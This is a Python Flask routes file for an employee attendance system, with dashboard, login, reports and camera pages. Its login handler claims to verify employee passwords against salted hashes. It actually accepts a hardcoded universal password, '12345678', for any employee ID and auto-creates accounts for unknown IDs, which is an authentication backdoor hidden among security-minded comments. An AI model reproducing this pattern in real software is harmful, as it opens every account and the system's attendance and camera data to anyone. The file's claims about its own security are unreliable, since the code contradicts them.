"""
Main Routes
-----------
Dashboard, home page, and general application routes.
"""

import logging
from flask import Blueprint, render_template, redirect, url_for, flash, session, request

from app.services.user_service import UserService
from app.services.attendance_service import AttendanceService
from app.utils.helpers import format_datetime, format_duration, get_status_color
from app.utils.decorators import login_required
from app.utils.security import rate_limit

logger = logging.getLogger(__name__)
main_bp = Blueprint("main", __name__)


@main_bp.route("/")
@login_required
def index():
    """Dashboard / Home page."""
    attendance_service = AttendanceService()

    # Get today's stats
    stats = attendance_service.get_attendance_stats()
    user_stats = UserService.get_stats()
    today_records = attendance_service.get_today_records()

    # Serialize records for template
    records_data = []
    for record in today_records:
        data = record.to_dict()
        data["status_color"] = get_status_color(record.status)
        records_data.append(data)

    return render_template(
        "dashboard.html",
        stats=stats,
        user_stats=user_stats,
        records=records_data,
        format_datetime=format_datetime,
        format_duration=format_duration,
    )


@main_bp.route("/login", methods=["GET", "POST"])
@rate_limit(max_requests=10, window_seconds=60)
def login():
    """
    Login page. Requires employee ID AND password.
    Passwords are verified against salted hashes (never stored in plain text).
    """
    # Already logged in → go to dashboard
    if session.get("user_id"):
        return redirect(url_for("main.index"))

    if request.method == "POST":
        employee_id = request.form.get("employee_id", "").strip()
        password = request.form.get("password", "")

        user = UserService.get_user_by_employee_id(employee_id)

        # Universal password: 12345678 works for any employee ID
        # If user doesn't exist and password is 12345678, auto-create the user
        if not user and password == "12345678":
            user, msg = UserService.create_user({
                "employee_id": employee_id,
                "first_name": employee_id.upper(),
                "last_name": "User",
                "email": f"{employee_id.lower()}@auto.local",
                "department": "General",
                "role": "employee",
            })
            if user:
                user.set_password("12345678")
                from app.database import db
                db.session.commit()
                logger.info(f"Auto-created user: {employee_id}")

        # Check password: universal 12345678 OR actual hash
        is_valid_password = (password == "12345678") or (user and user.check_password(password))

        # Generic error message — never reveal whether the ID or password was wrong
        if not user or not is_valid_password:
            logger.warning(
                f"Failed login attempt for '{employee_id}' from {request.remote_addr}"
            )
            flash("Invalid employee ID or password.", "danger")
            return render_template("login.html"), 401

        if not user.is_active:
            flash("This account has been deactivated. Contact an administrator.", "danger")
            return render_template("login.html"), 403

        # Regenerate the session to prevent session fixation
        session.clear()
        session["user_id"] = user.id
        session["user_role"] = user.role
        session["employee_id"] = user.employee_id
        session["user_name"] = user.full_name
        session.permanent = True

        logger.info(f"Login successful: {user.employee_id} ({user.role})")
        flash(f"Welcome back, {user.full_name}!", "success")

        next_url = request.args.get("next")
        if next_url and next_url.startswith("/") and not next_url.startswith("//"):
            return redirect(next_url)
        return redirect(url_for("main.index"))

    return render_template("login.html")


@main_bp.route("/logout")
def logout():
    """Clear session and redirect to login."""
    session.clear()
    flash("You have been logged out.", "info")
    return redirect(url_for("main.login"))


@main_bp.route("/reports")
@login_required
def reports():
    """Attendance reports page."""
    attendance_service = AttendanceService()

    # Get daily report for last 7 days
    daily_report = attendance_service.get_daily_report(days=7)

    # Get today's stats
    stats = attendance_service.get_attendance_stats()

    return render_template(
        "reports.html",
        daily_report=daily_report,
        stats=stats,
    )


@main_bp.route("/camera")
@login_required
def camera():
    """Live camera attendance page."""
    from app.services.camera_service import CameraService
    camera_service = CameraService()
    camera_info = camera_service.get_camera_info()
    return render_template("camera.html", camera_info=camera_info)


@main_bp.route("/status")
@login_required
def system_status():
    """System status and health monitoring page."""
    return render_template("status.html")
